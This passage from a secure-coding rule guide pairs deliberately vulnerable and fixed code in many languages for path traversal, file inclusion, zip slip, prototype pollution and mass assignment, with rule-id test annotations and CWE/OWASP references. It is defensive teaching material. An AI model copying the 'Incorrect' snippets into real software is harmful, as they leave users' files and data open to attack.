end

def test_param_ok
    map = make_map
    thing = map[params.id]
    # ok: check-render-local-file-include
    render :file => "/some/path/#{thing}"
end

def test_render_static_template_name
    # ok: check-render-local-file-include
    render :update, locals: { username: params[:username] }
end
```

**References:**

- CWE-22: Path Traversal

- [OWASP Local File Inclusion Testing](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

---

**Incorrect: vulnerable to path traversal**

```ruby
def foo
    # ruleid: avoid-tainted-file-access
    File.open("/tmp/#{params[:name]}")

    # ruleid: avoid-tainted-file-access
    Dir.open("/tmp/#{params[:name]}")

    # ruleid: avoid-tainted-file-access
    File.delete("/tmp/#{params[:name]}")

    # ruleid: avoid-tainted-file-access
    File.readlines("/tmp/#{params[:name]}")
end
```

**Correct: safe**

```ruby
def foo
    # ok: avoid-tainted-file-access
    File.open("/tmp/usr/bin")

    # ok: avoid-tainted-file-access
    File.basename("/tmp/#{params[:name]}")
end
```

**References:**

- CWE-22: Path Traversal

- [Brakeman File Access Warnings](https://github.com/presidentbeef/brakeman/blob/main/docs/warning_types/file_access/index.markdown)

---

**Incorrect: vulnerable**

```ruby
def bad_file_disclosure
    # ruleid: file-disclosure
    config.serve_static_assets = true
end
```

**Correct: safe**

```ruby
def ok_file_disclosure
    # ok: file-disclosure
    config.serve_static_assets = false
end
```

**References:**

- CWE-22: Path Traversal

- [Rails Security Advisory](https://groups.google.com/g/rubyonrails-security/c/23fiuwb1NBA/m/MQVM1-5GkPMJ)

---

**Incorrect: vulnerable to path traversal**

```javascript
const {readFile} = require('fs/promises')
const fs = require('fs')

function test1(fileName) {
  // ruleid:detect-non-literal-fs-filename
  readFile(fileName)
    .then((resolve, reject) => {
      foobar()
    })
}

async function test2(fileName) {
  // ruleid:detect-non-literal-fs-filename
  const data = await fs.promises.mkdir(fileName, {})
  foobar(data)
}

function test3(fileName) {
  const data = new Uint8Array(Buffer.from('Hello Node.js'));
  // ruleid:detect-non-literal-fs-filename
  fs.writeFile(fileName, data, (err) => {
    if (err) throw err;
    console.log('The file has been saved!');
  });
}
```

**Correct: safe**

```javascript
function okTest1(data) {
  const data = new Uint8Array(Buffer.from('Hello Node.js'));
  // ok:detect-non-literal-fs-filename
  fs.writeFile('message.txt', data, (err) => {
    if (err) throw err;
    console.log('The file has been saved!');
  });
}

async function okTest2() {
  let filehandle;
  try {
    // ok:detect-non-literal-fs-filename
    filehandle = await fs.promises.open('thefile.txt', 'r');
  } finally {
    if (filehandle !== undefined)
      await filehandle.close();
  }
}
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```javascript
var path = require('path');

function test1() {
    function someFunc(entry) {
        // ruleid:path-join-resolve-traversal
        var extractPath = path.join(opts.path, entry.path);
        return extractFile(extractPath);
    }
    someFunc();
}

function test2() {
    function someFunc(val) {
        createFile({
            // ruleid:path-join-resolve-traversal
            filePath: path.resolve(opts.path, val)
        })
        return true
    }
    someFunc()
}
```

**Correct: path sanitized**

```javascript
function okTest3(req,res) {
    let somePath = req.body.path;
    somePath = somePath.replace(/^(\.\.(\/|\\|$))+/, '');
    // ok:path-join-resolve-traversal
    return path.join(opts.path, somePath);
}

function okTest4(req,res) {
    let somePath = sanitizer(req.body.path);
    // ok:path-join-resolve-traversal
    return path.join(opts.path, somePath);
}

function okTest5(req,res) {
    let somePath = req.body.path;
    // ok:path-join-resolve-traversal
    let result = path.join(opts.path, somePath);
    if (result.indexOf(opts.path) === 0) {
        return path;
    }
    return null
}
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```typescript
import path = require('path')
import { Request, Response, NextFunction } from 'express'

module.exports = function badNormal () {
  return (req: Request, res: Response, next: NextFunction) => {
    const file = req.params.file
    // ruleid: express-res-sendfile
    res.sendFile(path.resolve('ftp/', file))
    // ruleid: express-res-sendfile
    res.sendFile(path.join('/ftp/', file))
    // ruleid: express-res-sendfile
    res.sendFile(file)
  }
}
```

**Correct: safe with root option or static file**

```typescript
module.exports = function goodNormal () {
  return (req: Request, res: Response, next: NextFunction) => {
    const file = 'foo'
    // ok: express-res-sendfile
    res.sendFile(path.resolve('ftp/', file))
    // ok: express-res-sendfile
    res.sendfile(req.params.foo, {root: '/'});
    // ok: express-res-sendfile
    res.sendfile(req.params.foo, options);
  }
}
```

**References:**

- CWE-73: External Control of File Name or Path

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

---

**Incorrect: vulnerable to path traversal**

```javascript
const path = require('path')
const express = require('express')
const app = express()

app.get('/test1', (req, res) => {
    // ruleid:express-path-join-resolve-traversal
    var extractPath = path.join(opts.path, req.query.path);
    extractFile(extractPath);
    res.send('Hello World!');
})

app.post('/test2', function test2(req, res) {
    // ruleid:express-path-join-resolve-traversal
    createFile({filePath: path.resolve(opts.path, req.body)})
    res.send('Hello World!')
})
```

**Correct: sanitized**

```javascript
app.post('/ok-test3', function (req,res) {
    let somePath = req.body.path;
    somePath = somePath.replace(/^(\.\.(\/|\\|$))+/, '');
    // ok:express-path-join-resolve-traversal
    return path.join(opts.path, somePath);
})

app.post('/ok-test4', function (req,res) {
    let somePath = sanitizer(req.body.path);
    // ok:express-path-join-resolve-traversal
    return path.join(opts.path, somePath);
})
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```python
from django.http import FileResponse

def func(request):
    # ruleid: request-data-fileresponse
    filename = request.POST.get("filename")
    f = open(filename, 'rb')
    return FileResponse(f)
```

**Correct: safe**

```python
def safe(request):
    # ok: request-data-fileresponse
    url = request.GET.get("url")
    print(url)
    f = open("blah.txt", 'r')
    return FileResponse(f)
```

**References:**

- CWE-22: Path Traversal

- [Django Security](https://django-book.readthedocs.io/en/latest/chapter20.html#cross-site-scripting-xss)

---

**Incorrect: vulnerable to path traversal**

```python
def unsafe(request):
    # ruleid: path-traversal-open
    filename = request.POST.get('filename')
    contents = request.POST.get('contents')
    print("something")
    f = open(filename, 'r')
    f.write(contents)
    f.close()

def unsafe_with(request):
    # ruleid: path-traversal-open
    filename = request.POST.get("filename")
    with open(filename, 'r') as fin:
        data = fin.read()
    return HttpResponse(data)
```

**Correct: safe**

```python
def safe(request):
    # ok: path-traversal-open
    filename = "/tmp/data.txt"
    f = open(filename)
    f.write("hello")
    f.close()
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```python
from django.http import HttpResponse
import os

def foo_1(request):
  # ruleid: path-traversal-join
  param = request.GET.get('param')
  file_path = os.path.join("MY_SECRET", param)
  f = open(file_path, 'r')
  return HttpResponse(content=f, content_type="text/plain")

def user_pic(request):
    base_path = os.path.join(os.path.dirname(__file__), '../../badguys/static/images')
    # ruleid: path-traversal-join
    filename = request.GET.get('p')
    data = open(os.path.join(base_path, filename), 'rb').read()
    return HttpResponse(data, content_type=mimetypes.guess_type(filename)[0])
```

**Correct: path validated with abspath**

```python
def foo_2(request):
  # ok due to abspath
  param = request.GET.get('param')
  file_path = os.path.join("MY_SECRET", param)
  file_path = os.path.abspath(file_path)
  f = open(file_path, 'r')
  return HttpResponse(content=f, content_type="text/plain")
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```python
from flask import send_file

app = Flask(__name__)

@app.route("/<path:filename>")
def download_file(filename):
  # ruleid:avoid_send_file_without_path_sanitization
  return send_file(filename)
```

**Correct: not a Flask route or use send_from_directory**

```python
def download_not_flask_route(filename):
  # ok:avoid_send_file_without_path_sanitization
  return send_file(filename)
```

**References:**

- CWE-73: External Control of File Name or Path

- [OWASP Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design)

---

**Incorrect: vulnerable to path traversal**

```python
import flask

app = flask.Flask(__name__)

@app.route("/route_param/<route_param>")
def route_param(route_param):
    print("blah")
    # ruleid: path-traversal-open
    return open(route_param, 'r').read()

@app.route("/get_param", methods=["GET"])
def get_param():
    param = flask.request.args.get("param")
    # ruleid: path-traversal-open
    f = open(param, 'w')
    f.write("hello world")

@app.route("/post_param", methods=["POST"])
def post_param():
    param = flask.request.form['param']
    if True:
        # ruleid: path-traversal-open
        with open(param, 'r') as fin:
            data = json.load(fin)
    return data
```

**Correct: static path**

```python
@app.route("/ok")
def ok():
    # ok: path-traversal-open
    open("static/path.txt", 'r')

@app.route("/route_param_ok/<route_param>")
def route_param_ok(route_param):
    print("blah")
    # ok: path-traversal-open
    return open("this is safe", 'r').read()
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```java
@RestController
public class PreflightController {
    @RequestMapping(
            CONTENT_DISPOSITION_STATIC_FILE_LOCATION + FrameworkConstants.SLASH + "{fileName}")
    public ResponseEntity<byte[]> fetchFile(@PathVariable("fileName") String fileName)
            throws IOException {
        InputStream inputStream =
                // ruleid: tainted-file-path
                new FileInputStream(
                        unrestrictedFileUpload.getContentDispositionRoot().toFile()
                                + FrameworkConstants.SLASH
                                + fileName);
        HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.add(HttpHeaders.CONTENT_DISPOSITION, "attachment");
        return new ResponseEntity<byte[]>(
                IOUtils.toByteArray(inputStream), httpHeaders, HttpStatus.OK);
    }

    public static void bad(@RequestParam String user) {
        // ruleid: tainted-file-path
        BufferedReader fileReader = new BufferedReader(new FileReader("/home/" + user + "/" + filename));
    }
}
```

**Correct: sanitized with FilenameUtils**

```java
public static void ok(@RequestParam String filename) {
    ApplicationContext appContext =
       new ClassPathXmlApplicationContext(new String[] {"If-you-have-any.xml"});

    // ok: tainted-file-path
    Resource resource =
       appContext.getResource("classpath:com/" + org.apache.commons.io.FilenameUtils.getName(filename));
}
```

**References:**

- CWE-23: Relative Path Traversal

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```java
public class Cls extends HttpServlet {
    public void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException {
        String image = request.getParameter("image");
        // ruleid:httpservlet-path-traversal
        File file = new File("static/images/", image);

        if (!file.exists()) {
            log.info(image + " could not be created.");
            response.sendError();
        }
        response.sendRedirect("/index.html");
    }
}
```

**Correct: sanitized with FilenameUtils**

```java
public void ok(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {
    // ok:httpservlet-path-traversal
    String image = request.getParameter("image");
    File file = new File("static/images/", FilenameUtils.getName(image));

    if (!file.exists()) {
        log.info(image + " could not be created.");
        response.sendError();
    }
    response.sendRedirect("/index.html");
}
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://www.owasp.org/index.php/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```java
@Path("/")
public class Cls {
    // ruleid:jax-rs-path-traversal
    @GET
    @Path("/images/{image}")
    @Produces("images/*")
    public Response getImage(@javax.ws.rs.PathParam("image") String image) {
        File file = new File("resources/images/", image); //Weak point

        if (!file.exists()) {
            return Response.status(Status.NOT_FOUND).build();
        }
        return Response.ok().entity(new FileInputStream(file)).build();
    }
}
```

**Correct: sanitized with FilenameUtils**

```java
// ok:jax-rs-path-traversal
@GET
@Path("/images/{image}")
@Produces("images/*")
public Response ok(@javax.ws.rs.PathParam("image") String image) {
    File file = new File("resources/images/", FilenameUtils.getName(image)); //Fix

    if (!file.exists()) {
        return Response.status(Status.NOT_FOUND).build();
    }
    return Response.ok().entity(new FileInputStream(file)).build();
}
```

**References:**

- CWE-22: Path Traversal

- [OWASP Path Traversal](https://www.owasp.org/index.php/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```csharp
public class Foo{
    public static bytes[] GetFileBad(string filename) {
        if (string.IsNullOrEmpty(filename))
        {
            throw new ArgumentNullException("error");
        }
        string filepath = Path.Combine("\\FILESHARE\images", filename);
        // ruleid: unsafe-path-combine
        return File.ReadAllBytes(filepath);
    }
}
```

**Correct: sanitized with Path.GetFileName**

```csharp
public static bytes[] GetFileSafe(string filename) {
    if (string.IsNullOrEmpty(filename))
    {
        throw new ArgumentNullException("error");
    }
    filename = Path.GetFileName(filename);
    // ok: unsafe-path-combine
    string filepath = Path.Combine("\\FILESHARE\images", filename);
    return File.ReadAllBytes(filepath);
}

public static bytes[] GetFileSafe2(string filename) {
    if (string.IsNullOrEmpty(filename) || Path.GetFileName(filename) != filename)
    {
        throw new ArgumentNullException("error");
    }
    string filepath = Path.Combine("\\FILESHARE\images", filename);
    // ok: unsafe-path-combine
    return File.ReadAllBytes(filepath);
}

public static bytes[] GetFileSafe3(string filename) {
    if (string.IsNullOrEmpty(filename))
    {
        throw new ArgumentNullException("error");
    }
    // ok: unsafe-path-combine
    string filepath = Path.Combine("\\FILESHARE\images", Path.GetFileName(filename));
}
```

**References:**

- CWE-22: Path Traversal

- [Path.Combine Security Issues](https://www.praetorian.com/blog/pathcombine-security-issues-in-aspnet-applications/)

- [Microsoft Path.Combine Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-6.0#remarks)

---

**Incorrect: vulnerable to path traversal/RFI**

```php
<?php
$user_input = $_GET["tainted"];

// ruleid: file-inclusion
include($user_input);

// ruleid: file-inclusion
include_once($user_input);

// ruleid: file-inclusion
require($user_input);

// ruleid: file-inclusion
require_once($user_input);

// ruleid: file-inclusion
include(__DIR__ . $user_input);
?>
```

**Correct: constant paths**

```php
<?php
// ok: file-inclusion
include('constant.php');

// ok: file-inclusion
require_once('constant.php');

// ok: file-inclusion
include(__DIR__ . 'constant.php');

// ok: file-inclusion
include_safe(__DIR__ . $user_input);

// ok: file-inclusion
require_once(CONFIG_DIR . '/constant.php');

// ok: file-inclusion
require_once( dirname( __FILE__ ) . '/admin.php' );
?>
```

**References:**

- CWE-98: PHP Remote File Inclusion

- [PHP include Documentation](https://www.php.net/manual/en/function.include.php)

- [File Inclusion Vulnerability Types](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Types_of_Inclusion)

---

**Incorrect: vulnerable to path traversal**

```php
<?php
$data = $_GET["data"];
// ruleid: unlink-use
unlink("/storage/" . $data . "/test");
?>
```

**Correct: constant path**

```php
<?php
// ok: unlink-use
unlink('/storage/foobar/test');
?>
```

**References:**

- CWE-22: Path Traversal

- [PHP unlink Documentation](https://www.php.net/manual/en/function.unlink)

---

**Incorrect: potential path traversal**

```php
<?php
// ruleid: wp-file-download-audit
$json = file_get_contents( 'php://input' );

// ruleid: wp-file-download-audit
readfile($zip_name);

// ruleid: wp-file-inclusion-audit
require $located;

// ruleid: wp-file-inclusion-audit
include_once($extension_upload_value);

// ruleid: wp-file-manipulation-audit
wp_delete_file( $file_path );

// ruleid: wp-file-manipulation-audit
unlink($file_path);
?>
```

**References:**

- CWE-22: Path Traversal

- CWE-73: External Control of File Name or Path

- [WordPress Plugin Security Testing Cheat Sheet](https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet)

---

**Incorrect: vulnerable to path traversal**

```scala
class Test {
  def bad1(value:String) = Action {
    if (!Files.exists(Paths.get("public/lists/" + value))) {
      NotFound("File not found")
    } else {
      // ruleid: path-traversal-fromfile
      val result = Source.fromFile("public/lists/" + value).getLines().mkString // Weak point
      Ok(result)
    }
  }

  def bad3(value:String) = Action {
    if (!Files.exists(Paths.get("public/lists/" + value))) {
      NotFound("File not found")
    } else {
      // ruleid: path-traversal-fromfile
      val result = Source.fromFile("%s/%s".format("public/lists", value)).getLines().mkString
      Ok(result)
    }
  }
}
```

**Correct: sanitized with FilenameUtils**

```scala
def ok(value:String) = Action {
    val filename = "public/lists/" + FilenameUtils.getName(value)

    if (!Files.exists(Paths.get(filename))) {
      NotFound("File not found")
    } else {
      // ok: path-traversal-fromfile
      val result = Source.fromFile(filename).getLines().mkString // Fix
      Ok(result)
    }
  }
```

**References:**

- CWE-22: Path Traversal

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: vulnerable to zip slip**

```go
func unzip(archive, target string) error {
	// ruleid: path-traversal-inside-zip-extraction
	reader, err := zip.OpenReader(archive)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(target, 0750); err != nil {
		return err
	}

	for _, file := range reader.File {
		path := filepath.Join(target, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(path, file.Mode())
			continue
		}

		fileReader, err := file.Open()
		if err != nil {
			return err
		}
		defer fileReader.Close()

		targetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())
		if err != nil {
			return err
		}
		defer targetFile.Close()

		if _, err := io.Copy(targetFile, fileReader); err != nil {
			return err
		}
	}
	return nil
}
```

**References:**

- CWE-22: Path Traversal

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: Clean does not prevent traversal**

```go
func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/bad1", func(w http.ResponseWriter, r *http.Request) {
		// ruleid: filepath-clean-misuse
		filename := filepath.Clean(r.URL.Path)
		filename := filepath.Join(root, strings.Trim(filename, "/"))
		contents, err := ioutil.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Write(contents)
	})

	mux.HandleFunc("/bad2", func(w http.ResponseWriter, r *http.Request) {
		// ruleid: filepath-clean-misuse
		filename := path.Clean(r.URL.Path)
		filename := filepath.Join(root, strings.Trim(filename, "/"))
		contents, err := ioutil.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Write(contents)
	})
}
```

**Correct: prefix with "/" or use SecureJoin**

```go
mux.HandleFunc("/ok2", func(w http.ResponseWriter, r *http.Request) {
    // ok: filepath-clean-misuse
    filename := path.Clean("/" + r.URL.Path)
    filename := filepath.Join(root, strings.Trim(filename, "/"))
    contents, err := ioutil.ReadFile(filename)
    if err != nil {
        w.WriteHeader(http.StatusNotFound)
        return
    }
    w.Write(contents)
})
```

**Best Practice:** Use `filepath.FromSlash(path.Clean("/"+strings.Trim(req.URL.Path, "/")))` or the `SecureJoin` function from `github.com/cyphar/filepath-securejoin`.

**References:**

- CWE-22: Path Traversal

- [Go path.Clean Documentation](https://pkg.go.dev/path#Clean)

- [Go Path Traversal Article](https://dzx.cz/2021/04/02/go_path_traversal/)

- [Grafana Zero-Day Path Traversal](https://labs.detectify.com/2021/12/15/zero-day-path-traversal-grafana/)

- [filepath-securejoin Package](https://pkg.go.dev/github.com/cyphar/filepath-securejoin#section-readme)

### 0.15 Prevent Prototype Pollution

**Impact: HIGH (Attackers can modify object prototypes to inject malicious properties, leading to privilege escalation, denial of service, or remote code execution)**

Prototype pollution is a vulnerability that occurs when an attacker can modify the prototype of a base object, such as `Object.prototype` in JavaScript. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones (such as `hasOwnProperty`, `toString`, or `valueOf`).

This vulnerability class also includes mass assignment attacks in other languages, where attackers can set arbitrary attributes on models by manipulating request parameters.

**Possible mitigations:**

- Freeze the object prototype using `Object.freeze(Object.prototype)`

- Use objects without prototypes via `Object.create(null)`

- Block modifications to attributes that resolve to object prototype (`__proto__`, `constructor`)

- Use `Map` instead of plain objects for key-value storage

- In web frameworks, use strong parameter allowlisting to control which attributes can be set

---

**Incorrect: vulnerable to prototype pollution via dynamic assignment**

```javascript
app.get('/test/:id', (req, res) => {
    let id = req.params.id;
    let items = req.session.todos[id];
    if (!items) {
        items = req.session.todos[id] = {};
    }
    // ruleid: prototype-pollution-assignment
    items[req.query.name] = req.query.text;
    res.end(200);
});
```

**Correct: validate against dangerous keys**

```javascript
app.post('/testOk/:id', (req, res) => {
    let id = req.params.id;
    if (id !== 'constructor' && id !== '__proto__') {
        let items = req.session.todos[id];
        if (!items) {
            items = req.session.todos[id] = {};
        }
        // ok: prototype-pollution-assignment
        items[req.query.name] = req.query.text;
    }
    res.end(200);
});
```

**Correct: use static keys**

```javascript
function ok1(req, res) {
    let items = req.session.todos["id"];
    if (!items) {
        items = req.session.todos["id"] = {};
    }
    // ok: prototype-pollution-assignment
    items[req.query.name] = req.query.text;
    res.end(200);
}

function ok2(req, res) {
    let id = req.params.id;
    let items = req.session.todos[id];
    if (!items) {
        items = req.session.todos[id] = {};
    }
    // ok: prototype-pollution-assignment
    items["name"] = req.query.text;
    res.end(200);
}
```

**Incorrect: prototype pollution in loops**

```javascript
function test1(name, value) {
  if (name.indexOf('.') === -1) {
    this.config[name] = value;
    return this;
  }
  let config = this.config;
  name = name.split('.');

  const length = name.length;
  name.forEach((item, index) => {
    if (index === length - 1) {
      config[item] = value;
    } else {
      if (!helper.isObject(config[item])) {
        config[item] = {};
      }
      // ruleid:prototype-pollution-loop
      config = config[item];
    }
  });
  return this;
}

function test2(obj, props, value) {
  if (typeof props == 'string') {
    props = props.split('.');
  }
  if (typeof props == 'symbol') {
    props = [props];
  }
  var lastProp = props.pop();
  if (!lastProp) {
    return false;
  }
  var thisProp;
  while ((thisProp = props.shift())) {
    if (typeof obj[thisProp] == 'undefined') {
      obj[thisProp] = {};
    }
    // ruleid:prototype-pollution-loop
    obj = obj[thisProp];
    if (!obj || typeof obj != 'object') {
      return false;
    }
  }
  obj[lastProp] = value;
  return true;
}

function test3(obj, prop, val) {
  const segs = split(prop);
  const last = segs.pop();
  while (segs.length) {
    const key = segs.shift();
    // ruleid:prototype-pollution-loop
    obj = obj[key] || (obj[key] = {});
  }
  obj[last] = val;
}
```

**Correct: use numeric index in loops**

```javascript
function okTest1(name) {
  if (name.indexOf('.') === -1) {
    this.config[name] = value;
    return this;
  }
  let config = this.config;
  name = name.split('.');

  const length = name.length;
  name.forEach((item, index) => {
    // ok:prototype-pollution-loop
    config = config[index];
  });
  return this;
}

function okTest2(name) {
  let config = this.config;
  name = name.split('.');

  const length = name.length;
  for (let i = 0; i < name.length; i++) {
    // ok:prototype-pollution-loop
    config = config[i];
  }
  return this;
}
```

**Incorrect: mass assignment via Object.assign in Express**

```javascript
const express = require('express')
const app = express()
const port = 3000

function testController1(req, res) {
    try {
        const defaultData = {foo: true}
        // ruleid: express-data-exfiltration
        let data = Object.assign(defaultData, req.query)
        doSmthWith(data)
    } catch (err) {
        this.log.error(err);
    }
    res.end('ok')
};
app.get('/test1', testController1)

let testController2 = function (req, res) {
    const defaultData = {foo: {bar: true}}
    // ruleid: express-data-exfiltration
    let data = Object.assign(defaultData, {foo: req.query})
    doSmthWith(data)
    return res.send({ok: true})

}
app.get('/test2', testController2)

var testController3 = null;
testController3 = function (req, res) {
    const defaultData = {foo: true}
    let newData = req.body
    // ruleid: express-data-exfiltration
    let data = Object.assign(defaultData, newData)
    doSmthWith(data)
    return res.send({ok: true})
}
app.get('/test3', testController3)
```

**Correct: use safe data sources in Object.assign**

```javascript
let okController = function (req, res) {
    const defaultData = {foo: {bar: true}}
    // ok: express-data-exfiltration
    let data = Object.assign(defaultData, {foo: getFoo()})
    doSmthWith(data)
    return res.send({ok: true})
}
app.get('/ok-test2', okController)
```

---

**Incorrect: permitting dangerous attributes**

```ruby
params = ActionController::Parameters.new({
  person: {
    name: "Francesco",
    age:  22,
    role: "admin"
  }
})

#ruleid: check-permit-attributes-high
params.permit(:admin)

# ruleid: check-permit-attributes-medium
params.permit(:role_id)
```

**Correct: permit only safe attributes**

```ruby
#ok: check-permit-attributes-high
params.permit(:some_safe_property)

#ok: check-permit-attributes-medium
params.permit(:some_safe_property)
```

**Incorrect: dangerous attr_accessible and permit usage**

```ruby
class Bad_attr_accessible
   include  ActiveModel::MassAssignmentSecurity

   # ruleid: model-attr-accessible
   attr_accessible :name, :admin,
                   :telephone, as: :create_params
   # ruleid: model-attr-accessible
   attr_accessible :name, :banned,
                   as: :create_params
   # ruleid: model-attr-accessible
   attr_accessible :role,
                   :telephone, as: :create_params
   # ruleid: model-attr-accessible
   attr_accessible :name,
                   :account_id, as: :create_params

   # ruleid: model-attr-accessible
   User.new(params.permit(:name, :admin))
   # ruleid: model-attr-accessible
   params_with_conditional_require(ctrl.params).permit(:name, :age, :admin)

   # ruleid: model-attr-accessible
   User.new(params.permit(:role))
   # ruleid: model-attr-accessible
   User.new(params.permit(:banned, :name))
   # ruleid: model-attr-accessible
   User.new(params.permit(:address, :account_id, :age))

   # ruleid: model-attr-accessible
   params.permit!
end
```

**Correct: safe attr_accessible and permit usage**

```ruby
class Ok_attr_accessible
   # ok: model-attr-accessible
   attr_accessible :name, :address, :age,
                   :telephone, as: :create_params
   # ok: model-attr-accessible
   User.new(params.permit(:address, :acc, :age))
   # ok: model-attr-accessible
   params_with_conditional_require(ctrl.params).permit(:name, :address, :age)
end
```

**Incorrect: create_with bypasses strong parameters**

```ruby
def bad_create_with
    # ruleid: create-with
    user.blog_posts.create_with(params[:blog_post]).create
end
```

**Correct: use permit with create_with**

```ruby
def create
    # ok: create-with
    user.blog_posts.create(params[:blog_post])
    # ok: create-with
    user.blog_posts.create_with(params[:blog_post].permit(:title, :body, :etc)).create
end
```

**Incorrect: mass assignment without attr_accessible**

```ruby
def mass_assign_unsafe
    #ruleid: mass-assignment-vuln
    User.new(params[:user])
    #ruleid: mass-assignment-vuln
    user = User.new(params[:user])
    #ruleid: mass-assignment-vuln
    User.new(params[:user], :without_protection => true)
end
```

**Correct: use attr_accessible before mass assignment**

```ruby
def safe_send
    #ok: mass-assignment-vuln
    attr_accessible :name
    User.new(params[:user])

    #ok: mass-assignment-vuln
    attr_accessible :name
    user = User.new(params[:user])
end
```

**Incorrect: disabling mass assignment protection**

```ruby
# ruleid:mass-assignment-protection-disabled
User.new(params[:user], :without_protection => true)
```

**Correct: do not disable protection**

```ruby
# ok:mass-assignment-protection-disabled
User.new(params[:user])
```

**Incorrect: model without attr_accessible**

```ruby
# ruleid: model-attributes-attr-accessible
class User < ActiveRecord::Base
acts_as_authentic do |t|
    t.login_field=:login # for available options see documentation in: Authlogic::ActsAsAuthentic
  end # block optional
    has_attached_file :avatar, :styles => { :medium => "300x300>", :thumb => "100x100>" }
end

def create
    user = User.create(person_params)
end
```

**Correct: model with attr_accessible**

```ruby
class User < ActiveRecord::Base
acts_as_authentic do |t|
    t.login_field=:login # for available options see documentation in: Authlogic::ActsAsAuthentic
  end # block optional
    attr_accessible :login
  attr_accessible :first_name
    attr_accessible :middle_name
    attr_accessible :surname
    attr_accessible :permanent_address
    attr_accessible :correspondence_address
    attr_accessible :email
    attr_accessible :contact_no
    attr_accessible :gender
    attr_accessible :password
    attr_accessible :password_confirmation
    attr_accessible :avatar
    has_attached_file :avatar, :styles => { :medium => "300x300>", :thumb => "100x100>" }
end

def create
    user = User.create(person_params)
end
```

---

**Incorrect: mass assignment using **request**

```python
from django.shortcuts import render
from myapp.models import Whatzit

# Test cases borrowed from https://gist.github.com/jsocol/3217262

def create_whatzit(request):
    # ruleid: mass-assignment
    Whatzit.objects.create(**request.POST)
    return render(request, 'created.html')

def update_whatzit(request, id):
    whatzit = Whatzit.objects.filter(pk=id)
    # ruleid: mass-assignment
    whatzit.update(**request.POST)
    whatzit.save()
    return render(request, 'saved.html')
```

**Correct: explicitly assign each field**

```python
def good_whatzit(request):
    # ok: mass-assignment
    Whatzit.objects.create(
        name=request.POST.get('name'),
        dob=request.POST.get('dob')
    )
    return render(request, 'created.html')
```

---

**Incorrect: empty $guarded allows mass assignment**

```php
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class Flight extends Model
{
    /**
     * The primary key associated with the table.
     *
     * @var string
     */
    protected $primaryKey = 'flight_id';

    /**
    * The attributes that aren't mass assignable.
    *
    * @var array
    */
    // ruleid: laravel-dangerous-model-construction
    protected $guarded = [];
}
```

**Correct: use $fillable to explicitly allowlist attributes**

```php
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class Flight extends Model
{
    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = ['name', 'destination'];
}
```

---

**Incorrect: model binding without [Bind] attribute**

```csharp
using Microsoft.AspNetCore.Mvc;

public IActionResult Create(UserModel model)
{
    context.SaveChanges();
    // ruleid: mass-assignment
    return View("Index", model);
}
```

**Correct: use [Bind] attribute to allowlist properties**

```csharp
using Microsoft.AspNetCore.Mvc;

public IActionResult Create([Bind(nameof(UserModel.Name))] UserModel model)
{
    context.SaveChanges();
    // ok: mass-assignment
    return View("Index", model);
}

[HttpGet("/")]
public IActionResult Index()
{
    // ok: mass-assignment
    return NoContent();
}
```

---

**References:**

- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

- [OWASP Top 10 A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)

- [JavaScript Prototype Pollution Attack in NodeJS (PDF)](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

- [Laravel Mass Assignment Documentation](https://laravel.com/docs/9.x/eloquent#allowing-mass-assignment)

- [OWASP API Security - Mass Assignment](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md)

